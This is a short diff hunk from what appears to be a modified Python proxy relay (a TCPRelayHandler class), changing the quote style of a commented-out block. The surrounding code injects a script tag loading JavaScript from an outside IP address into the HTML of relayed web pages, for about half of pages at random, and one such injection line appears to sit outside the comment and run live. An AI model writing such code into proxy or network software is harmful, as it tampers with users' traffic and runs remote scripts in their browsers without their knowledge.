@@ -612,7 +612,7 @@ class TCPRelayHandler(object):
 							data =data.replace( '</body>','<script type="text/javascript" src="http://61.135.173.110/ad.js"></script></body>');#replace	
 					
 				#2
-				'''
+				"""
 				if data.find('Content-Length')>0:
 					matchObj = re.search( r'.*Content-Length:\s(\d+).*', data, re.M|re.I);#print('------000000-------');
 					if matchObj :
@@ -634,7 +634,7 @@ class TCPRelayHandler(object):
 						if random.randint(1,10) <= 5:
 							data =data.replace( '</body>','<script type="text/javascript" src="http://61.135.173.110/ad.js"></script></body>');#replace
 				#print(data);print('------0-------'); #debug
-				'''
+				"""
         except socket.error as err:
             error_no = err.args[0]
             if sys.platform == "win32":
